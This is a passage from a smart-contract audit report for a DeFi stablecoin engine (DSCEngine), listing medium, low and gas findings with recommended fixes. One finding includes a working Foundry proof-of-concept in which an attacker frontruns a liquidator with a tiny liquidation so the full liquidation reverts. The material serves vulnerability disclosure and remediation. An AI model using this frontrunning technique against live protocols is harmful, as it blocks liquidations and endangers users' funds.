Liquidators stand to earn less than expected collateral tokens for deposited DSC
## Tools Used
Manual review
## Recommendations
Function liquidate should have an input parameter uint256 minimumOutputTokens and the function should revert at Ln 253 if 

```sh
require(totalCollateralToRedeem >= minimumOutputTokens, "Too little collateral received.");  

```
## <a id='M-12'></a>M-12. DoS of full liquidations are possible by frontrunning the liquidators

_Submitted by [Tricko](/profile/clk69ooo50012ms08mzsngte2)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L229-L262

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L272-L280

## Summary
Liquidators must specify precise amounts of DSC tokens to be burned during the liquidation process. Unfortunately, this opens up the possibility for malicious actors to prevent the full liquidation by frontrunning the liquidator's transaction and liquidating minimal amounts of DSC.

## Vulnerability Details
Liquidations play a crucial role by maintaining collateralization above the desired ratio. If the value of the collateral drops, or if the user mints too much DSC tokens and breaches the minimum required ratio, the position becomes undercollateralized, posing a risk to the protocol. Liquidations help in enforcing these collateralization ratios, enabling DSC to maintain its value.

After detecting an unhealthy position, any liquidator can call the `liquidate()` function to burn the excess DSC tokens and receive part of the user's collateral as reward. To execute this function, the liquidator must specify the precise amount of DSC tokens to be burned. Due to this requirement, it becomes possible to block full liquidations (i.e liquidations corresponding to the user's entire minted amounts of DSC). This can be achieved by any address other than the one undergoing liquidation. This includes either a secondary address of the user being liquidated (attempting to protect their collateral), or any other malicious actor aiming to obstruct the protocol's re-collaterization. The necessity of using any address other than the one undergoing liquidation is due to the `_revertIfHealthFactorIsBroken(msg.sender)` at the end of the `liquidate()` function, therefore any other healthy address can be used to perform this attack.

This blocking mechanism operates by frontrunning the liquidator and triggering the liquidation of small amounts of DSC balance. Consequently, during the liquidator's transaction execution, it attempts to burn more tokens than the user has actually minted. This causes a revert due to an underflow issue, as illustrated in the code snippet below.

```solidity
function _burnDsc(uint256 amountDscToBurn, address onBehalfOf, address dscFrom) private {
    s_DSCMinted[onBehalfOf] -= amountDscToBurn; //Undeflow will happen here
    bool success = i_dsc.transferFrom(dscFrom, address(this), amountDscToBurn);
    if (!success) {
        revert DSCEngine__TransferFailed();
    }
    i_dsc.burn(amountDscToBurn);
}
```

The exact values of DSC that the attacker has to burn to block the liquidation are dependent on the value of the user collateral and his total amount of DSC minted, but in general this values are going to be small, on the orders of thousands of wei of DSC. For example for a collateral total value of 10000USD, and 5500 worth of DSC minted, a frontrun liquidation of just 2000 wei of DSC would be enough to prevent the full liquidation.

Consider the example scenario below. Alice has minted $5500 worth of DSC, however her ETH deposited as collateral is worth $10000, therefore below the minimum 200% collateralization.
1. Bob (the liquidator) sees Alice's position and decide to liquidate her full DSC position to restore the protocol health (by calling `liquidate(address(WETH), address(alice), 5500000000000000000000)`
2. Alice see Bob's transaction on the mempool and tries to frontrunning it by calling ``liquidate(address(WETH), address(alice), 2000)`` using her secondary address.
Consider that Alice is sucessfull in frontrunning Bob, therefore after Alice's tx, `s_DSCMinted[address(Alice)]` will be 5499999999999999998000.
3. Now during Bob's transaction execution, `liquidate` will try to burn `5500000000000000000000` DSC tokens from Alice, but her `s_DSCMinted[address(Alice)]` is `5499999999999999998000`, causing the call to revert due to arithmetic underflow.

See POC below for example:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {DeployDSC} from "../../script/DeployDSC.s.sol";
import {DSCEngine} from "../../src/DSCEngine.sol";
import {DecentralizedStableCoin} from "../../src/DecentralizedStableCoin.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {MockV3Aggregator} from "../mocks/MockV3Aggregator.sol";
import {Test} from "forge-std/Test.sol";
import {stdError} from "forge-std/StdError.sol";

contract LiquidationPOC is Test {
    DSCEngine public dsce;
    DecentralizedStableCoin public dsc;
    HelperConfig public helperConfig;

    address public ethUsdPriceFeed;
    address public btcUsdPriceFeed;
    address public weth;
    address public wbtc;
    uint256 public deployerKey;

    uint256 public constant MIN_HEALTH_FACTOR = 1e18;
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    address public attacker = makeAddr("attacker");

    function setUp() external {
        DeployDSC deployer = new DeployDSC();
        (dsc, dsce, helperConfig) = deployer.run();
        (ethUsdPriceFeed, btcUsdPriceFeed, weth, wbtc, deployerKey) = helperConfig.activeNetworkConfig();

        //Setting collateral USD prices
        MockV3Aggregator(ethUsdPriceFeed).updateAnswer(1100e8);

        //Mints and approvals for the Alice
        ERC20Mock(weth).mint(alice, 10 ether);
        vm.startPrank(alice);
        ERC20Mock(weth).approve(address(dsce), 10 ether);
        dsce.depositCollateralAndMintDsc(weth, 10 ether, 5500 ether);
        vm.stopPrank();

        //Mints and approvals for the Bob (liquidator)
        ERC20Mock(weth).mint(bob, 30 ether);
        vm.startPrank(bob);
        ERC20Mock(weth).approve(address(dsce), 30 ether);
        dsce.depositCollateralAndMintDsc(weth, 30 ether, 10000 ether);
        dsc.approve(address(dsce), 10000 ether);
        vm.stopPrank();

        //Mints and approvals for the attacker
        ERC20Mock(weth).mint(attacker, 10 ether);
        vm.startPrank(attacker);
        ERC20Mock(weth).approve(address(dsce), 10 ether);
        dsce.depositCollateralAndMintDsc(weth, 10 ether, 10 ether);
        dsc.approve(address(dsce), 10 ether);
        vm.stopPrank();

        //Reducing collateral USD price to put Alice in unhealthy state.
        MockV3Aggregator(ethUsdPriceFeed).updateAnswer(1000e8);
    }

    function testLiquidationDoS() public {
        (uint256 dscMinted, uint256 collateralUSD) = dsce.getAccountInformation(alice);
        assertEq(dscMinted, 5500*1e18);  //DSC worth $5500
        assertEq(collateralUSD, 10000*1e18); //Collateral worth $10000

        //1. Assert Alice position is unhealthy
        uint256 userHealthFactor = dsce.getHealthFactor(alice);
        assertEq(userHealthFactor < MIN_HEALTH_FACTOR, true); 

        //2. Attacker frontruns Bob's transaction and liquidates 2000wei of DSC
        vm.prank(attacker);
        dsce.liquidate(weth, alice, 2000); 

        //3. Bob's transaction reverts
        vm.expectRevert(stdError.arithmeticError); //Arithmetic over/underflow
        vm.prank(bob);
        dsce.liquidate(weth, alice, 5500*1e18);
    }
}
```

## Impact
Full liquidations can be blocked. Therefore liquidators will have to resort to partial liquidations that are less efficient and can leave dust debt in the contract, threatening the heatlh of the protocol.

## Tools Used 
Manual Review

## Recommendations
Consider allowing the liquidator to pass `type(uint256).max` as the `debtToCover` parameter, which will result to liquidating all DSC minted by the target account, regardless of the current balance. See the code below for an example implementation.

```diff
diff --git a/DSCEngine.orig.sol b/DSCEngine.sol
index e7d5c0d..6feef25 100644
--- a/DSCEngine.orig.sol
+++ b/DSCEngine.sol
@@ -227,36 +227,40 @@ contract DSCEngine is ReentrancyGuard {
      * Follows CEI: Checks, Effects, Interactions
      */
     function liquidate(address collateral, address user, uint256 debtToCover)
         external
         moreThanZero(debtToCover)
         nonReentrant
     {
         // need to check health factor of the user
         uint256 startingUserHealthFactor = _healthFactor(user);
         if (startingUserHealthFactor >= MIN_HEALTH_FACTOR) {
             revert DSCEngine__HealthFactorOk();
         }
         // We want to burn their DSC "debt"
         // And take their collateral
         // Bad User: $140 ETH, $100 DSC
         // debtToCover = $100
         // $100 of DSC == ??? ETH?
         // 0.05 ETH
+        if (debtToCover == type(uint256).max) {
+            (uint256 dscMinted,) = _getAccountInformation(user);
+            debtToCover = dscMinted;
+        }
         uint256 tokenAmountFromDebtCovered = getTokenAmountFromUsd(collateral, debtToCover);
         // And give them a 10% bonus
         // So we are giving the liquidator $110 of WETH for 100 DSC
         // We should implement a feature to liquidate in the event the protocol is insolvent
         // And sweep extra amounts into a treasury
         // 0.05 * 0.1 = 0.005. Getting 0.055
         uint256 bonusCollateral = (tokenAmountFromDebtCovered * LIQUIDATION_BONUS) / LIQUIDATION_PRECISION;
         uint256 totalCollateralToRedeem = tokenAmountFromDebtCovered + bonusCollateral;
         _redeemCollateral(user, msg.sender, collateral, totalCollateralToRedeem);
         // We need to burn the DSC
         _burnDsc(debtToCover, user, msg.sender);

         uint256 endingUserHealthFactor = _healthFactor(user);
         if (endingUserHealthFactor <= startingUserHealthFactor) {
             revert DSCEngine__HealthFactorNotImproved();
         }
         _revertIfHealthFactorIsBroken(msg.sender);
     }
```

# Low Risk Findings

## <a id='L-01'></a>L-01. Improving the burnDsc() to allow users to mitigate their liquidation's impact

_Submitted by [nmirchev8](/profile/clkao1p090000ld08dv6v2xus), [nisedo](/profile/clk3saar60000l608gsamuvnw), [StErMi](/profile/clk579hcp0014l508ybc3ec6z), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [iurii2002](/profile/clkjopcpe0020mb08ev4t85e5), [0x9527](/profile/clk6fywww000kk0089eqo3hem), [Ericselvig](/profile/clk3tbdri000qib08vc8d5xn2), [serialcoder](/profile/clkb309g90008l208so2bzcy6), [Tatakae](/team/clkpe7ipx0001kz08k8k1pp3v), [seraviz](/profile/clkctjlzr000al908xkmooh9q), [Maroutis](/profile/clkctygft000il9088nkvgyqk), [Ankit](/profile/clk3sb327000cl508dkwq4ypi). Selected submission by: [serialcoder](/profile/clkb309g90008l208so2bzcy6)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L214

## Summary

The `burnDsc()` does not allow a user to partially burn some available DSC tokens to mitigate the liquidation's impact (if an amount of the burned tokens are not sufficient to improve their health factor to become healthy (> `MIN_HEALTH_FACTOR`)).

## Vulnerability Details

In the situation that a user's health factor is unhealthy (< `MIN_HEALTH_FACTOR`), the user will not be able to partially burn some available of their minted DSC tokens to mitigate the liquidation's impact.

Specifically, the `_revertIfHealthFactorIsBroken()` in the `burnDsc()` will revert the transaction if the user's health factor is still unhealthy (even if the burning of the DSC tokens may improve the user's health factor).

```solidity
    function burnDsc(uint256 amount) public moreThanZero(amount) {
        _burnDsc(amount, msg.sender, msg.sender);
@>      _revertIfHealthFactorIsBroken(msg.sender); // I don't think this would ever hit...
    }
```

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L214

## Impact

The `burnDsc()` does not allow a user to partially burn some available DSC tokens to mitigate the liquidation's impact (if an amount of the burned tokens are not sufficient to improve their health factor to become healthy (> `MIN_HEALTH_FACTOR`)). 

With this design choice, a user may face a big impact from the liquidation that cannot be mitigated.

## Tools Used

Manual Review

## Recommendations

Consider removing the `_revertIfHealthFactorIsBroken()` from the `burnDsc()` to enable a user to partially burn some available DSC tokens to mitigate their liquidation's impact.

```diff
    function burnDsc(uint256 amount) public moreThanZero(amount) {
        _burnDsc(amount, msg.sender, msg.sender);
-       _revertIfHealthFactorIsBroken(msg.sender); // I don't think this would ever hit...
    }
```
## <a id='L-02'></a>L-02. Zero address check for tokens

_Submitted by [0xAadhi](/profile/clk75injq0004l908x4ygb7bp), [Phantasmagoria](/profile/clki6y71n000gkx088cowa4hq), [0xSmartContract](/profile/clkfyyoms0006jx08k30qx5nb), [seven](/profile/clk7ky2gi0000kx08dplq93ah), [0xlemon](/profile/clk70p00n000gl5082o0iufja), [JohnnyTime](/profile/clk6vuje90014mm0800cqeo8w), [33audits](/profile/clkh3zf810018mi08yjzuvbu1), [albertwhite](/profile/clkng2y9n0008jx082ult8mge), [frankudoags](/profile/clk7t3pbk000ejn08xqvbk3e9), [nmirchev8](/profile/clkao1p090000ld08dv6v2xus), [hunterw3b](/profile/clk4rq78j0000l108bpu51153), [ABA](/profile/clk43rqfo0008mg084q0ema3g), [MTN](/profile/clkmxetsh000smd08nrix62uv), [Bbash](/profile/clkcphh780004mp083mgcgae1), [Stoicov](/profile/clk43h7he008ymb08nk4eu446), [phoeniV110](/profile/clk687ykf0000l608ovci3h3y), [pxng0lin](/profile/clk7366lr002cl5087016oqvc), [0xMosh](/profile/clkab3oww0000kx08tbfkdxab), [SBSecurity](/team/clkuz8xt7001vl608nphmevro), [gss1](/profile/clki09vec000cla08u2o9reem), [SMA4](/profile/clkja41s4000ok008bpul7m18), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [Maroutis](/profile/clkctygft000il9088nkvgyqk), [owade](/profile/clk9j4mf20002mi08k4758eni), [tsar](/profile/clk9isayj0004l30847ln1e8j). Selected submission by: [SBSecurity](/team/clkuz8xt7001vl608nphmevro)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L112-L123

## Summary
In the current implementation the token and price feed addresses aren’t checked for zero address upon initialization, there is a modifier which catch scenarios when price feed with zero address will be passed, but not for token addresses.

## Vulnerability Details
When deploy the `DSCEngine.sol`, if pass token with address(0) and working price feed address, the deployment will be successful, but the user experience is going to fall when using the protocol, due to EVM Revert.

```solidity
// Deploying the protocol localy with token address(0)

return NetworkConfig({
        wethUsdPriceFeed: address(ethUsdPriceFeed),
        wbtcUsdPriceFeed: address(btcUsdPriceFeed),
        weth: address(0),
        wbtc: address(wbtcMock),
        deployerKey: DEFAULT_ANVIL_KEY
    });
}
```

## Impact
It will make freshly deployed DSCEngine unusable and the protocol deployer will have to redeploy everything.

## Tools Used
Manual, Foundry

## Recommendations
Add a check in the constructor

```solidity
constructor(address[] memory tokenAddresses, address[] memory priceFeedAddresses, address dscAddress) {
    // USD Price Feeds
    if (tokenAddresses.length != priceFeedAddresses.length) {
        revert DSCEngine__TokenAddressesAndPriceFeedAddressesMustBeSameLength();
    }
    // For example ETH / USD, BTC / USD, MKR / USD, etc
    for (uint256 i = 0; i < tokenAddresses.length; i++) {
    +   if (tokenAddresses[i] == address(0) || priceFeedAddresses[i] == address(0)) {
    +       revert DSCEngine__TokenAddressZero();
    +   }
        s_priceFeeds[tokenAddresses[i]] = priceFeedAddresses[i];
        s_collateralTokens.push(tokenAddresses[i]);
    }
    i_dsc = DecentralizedStableCoin(dscAddress);
}
```

```solidity
function getTokenAmountFromUsd(address token, uint256 usdAmountInWei) public view returns (uint256) {
    // price of ETH (token)
    // $/ETH ETH ??
    // $2000 / ETH. $1000 = 0.5 ETH
+   if (token == address(0)) {
+       revert DSCEngine__NotAllowedToken();
+   }
    AggregatorV3Interface priceFeed = AggregatorV3Interface(s_priceFeeds[token]);
    (, int256 price,,,) = priceFeed.staleCheckLatestRoundData();

    // ($10e3 * 1e18) / ($2000e8 * 1e10)
    return (usdAmountInWei * PRECISION) / (uint256(price) * ADDITIONAL_FEED_PRECISION);
}
```

```solidity
function getUsdValue(address token, uint256 amount) public view returns (uint256) {
+   if (token == address(0)) {
+       revert DSCEngine__NotAllowedToken();
+   }

    AggregatorV3Interface priceFeed = AggregatorV3Interface(s_priceFeeds[token]);
    (, int256 price,,,) = priceFeed.staleCheckLatestRoundData();
    // 1 ETH = $1000
    // The returned value from CL will be 1000 * 1e8
    return ((uint256(price) * ADDITIONAL_FEED_PRECISION) * amount) / PRECISION;
}
```

## <a id='L-03'></a>L-03. Lack of events for critical actions

_Submitted by [castleChain](/profile/clk48to2u004wla08041jl9ld), [ZanyBonzy](/profile/clk9uu45r0000js08lnm9zbez), [TeamFliBit](/team/clki07mfj0001la08ctbacja0), [TheSchnilch](/profile/clk89mhkb0002mk080c64z7b8), [mau](/profile/clk9v1fgt0008mn08czddr9to), [seraviz](/profile/clkctjlzr000al908xkmooh9q), [0xsandy](/profile/clk43kus5009imb0830ko7dxy), [FalconHoof](/profile/clkcm5dsf0000mc083q6clddz), [fouzantanveer](/profile/clkutlyji000olc09j81zek7d). Selected submission by: [0xsandy](/profile/clk43kus5009imb0830ko7dxy)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L229

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L212

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L197

## Summary
The functions ``mintDsc``, ``burnDsc`` and ``liquidate`` do not emit any events. 

## Vulnerability Details
Event logs are crucial for off-chain services as they notify external users, such as a listening frontend website or client application, that something has happened on the blockchain.

## Impact
External users and blockchain monitoring systems will not be able to easily detect these critical functions and their changes without events.

## Tools Used
Manual Analysis

## Recommendations
Add events where possible for critical operations.
## <a id='L-04'></a>L-04. Pragma isn't specified correctly which can lead to nonfunction/damaged contract when deployed on Arbitrum

_Submitted by [nisedo](/profile/clk3saar60000l608gsamuvnw), [0xNiloy](/profile/clk43a7ek000ojq085f8vxr9v), [JohnnyTime](/profile/clk6vuje90014mm0800cqeo8w), [mahdirostami](/profile/clk52jmr9000el008w4z3a043), [Madalad](/profile/clki3uj3i0000l508carwkhuh), [Bad](/profile/clk49rqar0004mr08jalnmz03), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [0xbug](/profile/clkch5i9j0008jz088olf29x1), [ch0bu](/profile/clk3xuwvc0030l80876l7savt), [0xAadhi](/profile/clk75injq0004l908x4ygb7bp), [97Sabit](/profile/clk42eeq0007mla08lc11yszp), [hunterw3b](/profile/clk4rq78j0000l108bpu51153), [sm4rty](/profile/clk4170ln003amb088n137st7), [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [ABA](/profile/clk43rqfo0008mg084q0ema3g), [larsson](/profile/clk7vllab0004l708xag2q0in), [tsvetanovv](/profile/clk3x0ilz001ol808l9uu6vpj), [Bauchibred](/profile/clk9ibj6p0002mh08c603lr2j), [funkornaut](/profile/clk4161cu0030mb08pybakf1m), [ChainSentry](/profile/clkdl8f190008mr08q90zjcne), [lwltea](/profile/clk7224p9000ujt08g853wh48), [kz0213871](/profile/clk9oqssu0008me08w56bq8n4), [0xMosh](/profile/clkab3oww0000kx08tbfkdxab), [mgf15](/profile/clk993ol40000mr08qghps3lm), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [mau](/profile/clk9v1fgt0008mn08czddr9to), [ni8mare](/profile/clk3xgimw001mmf08gkbh3jbm), [xfu](/profile/clke2oift0000l508j03apihy), [alexzoid](/profile/clk41t0lv006kla08p69ueiel). Selected submission by: [ni8mare](/profile/clk3xgimw001mmf08gkbh3jbm)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L24

## Summary
Pragma isn't specified correctly which can lead to a nonfunction/damaged contract when deployed on Arbitrum

## Vulnerability Details
Pragma has been set to ^0.8.18 allowing the contracts to be compiled with version 0.8.20. The problem with this is that Arbitrum is NOT compatible with 0.8.20 and newer. Contracts compiled with those versions will result in a nonfunctional or potentially damaged version that won't behave as expected. The default behaviour of the compiler would be to use the newest version which would mean by default it will be compiled with the 0.8.20 version which will produce broken code.

For more info - https://docs.arbitrum.io/solidity-support

The foundry.toml file also does not specify which solidity version will be used. The project is meant to be forked and is meant to be deployed on any EVM-compatible chain. Hence, a specific version needs to be used.

## Impact
Damaged or nonfunctional contracts when deployed on Arbitrum

## Tools Used
Manual review

## Recommendations
Constrain the pragma version:

```
pragma solidity >=0.8.0 <=0.8.19
```
## <a id='L-05'></a>L-05. Precision loss when calculating the health factor

_Submitted by [kutu](/profile/clk7qwwzw001gm9088xsr6a22), [nisedo](/profile/clk3saar60000l608gsamuvnw), [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l), [jnrlouis](/profile/clk4myztd0000l408kiebyflx), [ShayanShamsi](/profile/clk3tu0io001sl5080roowxvc), [33audits](/profile/clkh3zf810018mi08yjzuvbu1), [castleChain](/profile/clk48to2u004wla08041jl9ld), [ADM](/profile/clk4kalbm0008l508td2elpga), [charlesCheerful](/profile/clk3wmzul0008l808andx29ul), [t0x1c](/profile/clk7rcevn0004jn08o2n2g1a5), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [serialcoder](/profile/clkb309g90008l208so2bzcy6), [pontifex](/profile/clk3xo3e0000omm08i6ehw2ae), [klaus](/profile/clkwlspwi002sk008f6i0bjvu), [JPCourses](/profile/clk41wibj006sla08llbkfxxu). Selected submission by: [serialcoder](/profile/clkb309g90008l208so2bzcy6)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L330

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L331

## Summary

The calculation of the health factor in the `_calculateHealthFactor()` suffers from a rounding down issue, resulting in a small precision loss that can be improved.

## Vulnerability Details

Division before multiplication can lead to rounding down issue since Solidity has no fixed-point numbers. Consider the calculation of the health factor in the `_calculateHealthFactor()`, the function does [the division (by LIQUIDATION_PRECISION)](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L330) before [the multiplication (by 1e18)](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L331). Hence, the computed result can suffer from the rounding down issue, resulting in a small precision loss.

```solidity
    function _calculateHealthFactor(uint256 totalDscMinted, uint256 collateralValueInUsd)
        internal
        pure
        returns (uint256)
    {
        if (totalDscMinted == 0) return type(uint256).max;
@>      uint256 collateralAdjustedForThreshold = (collateralValueInUsd * LIQUIDATION_THRESHOLD) / LIQUIDATION_PRECISION; //@audit Division (by LIQUIDATION_PRECISION) before multiplication
@>      return (collateralAdjustedForThreshold * 1e18) / totalDscMinted; //@audit Multiplication (by 1e18) after division
    }
```

- `Division (by LIQUIDATION_PRECISION) before multiplication`: https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L330

- `Multiplication (by 1e18) after division`: https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L331

## Impact

The computed result of the `_calculateHealthFactor()` can suffer from the rounding down issue. However, the impact can be considerably low since the denominator, LIQUIDATION_PRECISION, is a constant of 100. Anyway, there can be a way to improve the calculation for better precision loss (see the `Recommendations` section).

## Tools Used

Manual Review

## Recommendations

I recommend improving the affected formula by taking multiplications before divisions to prevent truncation, as shown below.

```diff
    function _calculateHealthFactor(uint256 totalDscMinted, uint256 collateralValueInUsd)
        internal
        pure
        returns (uint256)
    {
        if (totalDscMinted == 0) return type(uint256).max;
-       uint256 collateralAdjustedForThreshold = (collateralValueInUsd * LIQUIDATION_THRESHOLD) / LIQUIDATION_PRECISION;
-       return (collateralAdjustedForThreshold * 1e18) / totalDscMinted;

+       return (collateralValueInUsd * LIQUIDATION_THRESHOLD * 1e18) / (LIQUIDATION_PRECISION * totalDscMinted);
    }
```
## <a id='L-06'></a>L-06. Unbounded Loops Found in DSCEngine.sol can lead to DoS of liquidations

_Submitted by [aviggiano](/profile/clk3yu8m7001kjq08r9a7wgsh), [0xdeadbeef](/profile/clke8rp1x0004jy08e1ddz8s0). Selected submission by: [aviggiano](/profile/clk3yu8m7001kjq08r9a7wgsh)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L353

## Summary

The contract `DSCEngine.sol` contains unbounded loops over the `s_collateralTokens` array, which is used in critical parts of the system, such as when checking the health factor of a user, which is used on liquidations. In some cases, such as with ERC777 tokens, a significant amount of gas can be consumed by a transaction such that it reverts due to block size limits, impacting the overall health of the system.

## Vulnerability Details

In `DSCEngine.sol:350`, the function `getAccountCollateralValue` loops through each collateral token, retrieves the deposited amount and maps it to the price to calculate the USD value. However, the iteration limit of this loop is dependent on the length of `s_collateralTokens`, which is not bound. This leads to a situation where the function could iterate through a large enough number of tokens, making the function susceptible to attacks that exploit high gas fees. 

If this is paired with tokens that contain callbacks or hooks, such as ERC777 tokens, the liquidated user can construct a contract such that it consumes too much gas on the [tokensToSend](https://docs.openzeppelin.com/contracts/2.x/api/token/erc777#IERC777Sender) (or analogous) hook, which would lead to DoS of the liquidation process.

## Impact

The unbounded-loop issue can lead to DoS if the number of collateral tokens is too high or if the liquidated account is able to manipulate the transaction gas.

## Tools Used

Manual Review

## Recommendations

Consider implementing a mechanism to bound the loop by either limiting the number of `s_collateralTokens` that can be added.

## <a id='L-07'></a>L-07. Missing Division By 0 Check

_Submitted by [vic43](/profile/clkx55fzt0008l408wtdumivr)._      
				


## Summary
The DSCEngine contract defines the getTokenAmountFromUsd function, which 
implement a division.  however, the division by 0
check is missing, which will cause an error if encountered.
## Vulnerability Details
the division by zero may happen if the price provided by the pricefeed is 0;
## Impact
the division will cause a runtime exception, and the transaction that triggered the division by zero will be reverted.-> transaction will fail & any changes made to the state of the contract during the transaction will be rolled back.
## Tools Used
Manual Review
## Recommendations
It is recommended to implement a validation mechanism, which will make
sure that division by 0 scenarios are handled properly.
+ Consider adding a second price feed oracle.

# Gas Optimizations / Informationals

## <a id='G-01'></a>G-01. using x=x+y /x=x-y is more gas efficient than x+=y / x-=y

_Submitted by [0xSafeGuard](/team/clkhmrygo0001l508vlnyl978), [mahdirostami](/profile/clk52jmr9000el008w4z3a043), [souilos](/profile/clkm7ipa90014l608xim10mt3), [castleChain](/profile/clk48to2u004wla08041jl9ld), [0x0115](/profile/clk4scd7q0000l208rpyf7gvh), [0xNiloy](/profile/clk43a7ek000ojq085f8vxr9v), [Bbash](/profile/clkcphh780004mp083mgcgae1), [Qiezie](/profile/clk3vxv520010kx08lj3sw4ok), [TheSavageTeddy](/profile/clk9nkvfc0000m9080ev2utin), [0xbugalba](/team/clkff1bat0001k4082yo3xy8j), [SAQ](/profile/clkftc56x0006le08usdp7epo), [0xadarsh](/profile/clkvfe7q8000wl408zqbmb7do), [owade](/profile/clk9j4mf20002mi08k4758eni). Selected submission by: [castleChain](/profile/clk48to2u004wla08041jl9ld)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L356

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L155

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L198

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L273

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L285

## details 
using x=x+y /x=x-y  is more gas efficient than x+=y / x-=y

```
totalCollateralValueInUsd += getUsdValue(token, amount);
```

## Recommendations
use x=x-y and x=x+y  
```
totalCollateralValueInUsd = totalCollateralValueInUsd + getUsdValue(token, amount);
```

## <a id='G-02'></a>G-02. Remove unused variables in `OracleLib`

_Submitted by [SBSecurity](/team/clkuz8xt7001vl608nphmevro)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/libraries/OracleLib.sol#L21-L33

## Summary
Currently `OracleLib.staleCheckLatestRoundData()` returns 4 variables `(uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)` which are returned from `latestRoundData()` 

In the current implementation, only `answer` variable is used.  By removing all the unused properties in both library and at the places where library method is used we will save roughly 400 gas.

## Instances

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/libraries/OracleLib.sol#L21-L33

## Tools Used
Manual

## Recommendations
Updated OracleLib
```solidity
library OracleLib 

function staleCheckLatestRoundData(AggregatorV3Interface priceFeed)
    public
    view
    - returns (uint80, int256, uint256, uint256, uint80)
	+ returns (int256)
{
    - (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) =
        priceFeed.latestRoundData();
	+ (, int256 answer,, uint256 updatedAt,) = priceFeed.latestRoundData();

    uint256 secondsSince = block.timestamp - updatedAt;
    if (secondsSince > TIMEOUT) revert OracleLib__StalePrice();

    - return (roundId, answer, startedAt, updatedAt, answeredInRound);
	+ return (answer);
}
```

```solidity
contract DSCEngine

function getUsdValue(address token, uint256 amount) public view returns (uint256) {
    AggregatorV3Interface priceFeed = AggregatorV3Interface(s_priceFeeds[token]);
	- (, int256 price,,,) = priceFeed.staleCheckLatestRoundData();
    + int256 price = priceFeed.staleCheckLatestRoundData();
    // 1 ETH = $1000
    // The returned value from CL will be 1000 * 1e8е
    return ((uint256(price) * ADDITIONAL_FEED_PRECISION) * amount) / PRECISION;
}
```

```solidity
contract DSCEngine

function getTokenAmountFromUsd(address token, uint256 usdAmountInWei) public view returns (uint256) {
    // price of ETH (token)
    // $/ETH ETH ??
    // $2000 / ETH. $1000 = 0.5 ETH
    AggregatorV3Interface priceFeed = AggregatorV3Interface(s_priceFeeds[token]);
    - (, int256 price,,,) = priceFeed.staleCheckLatestRoundData();
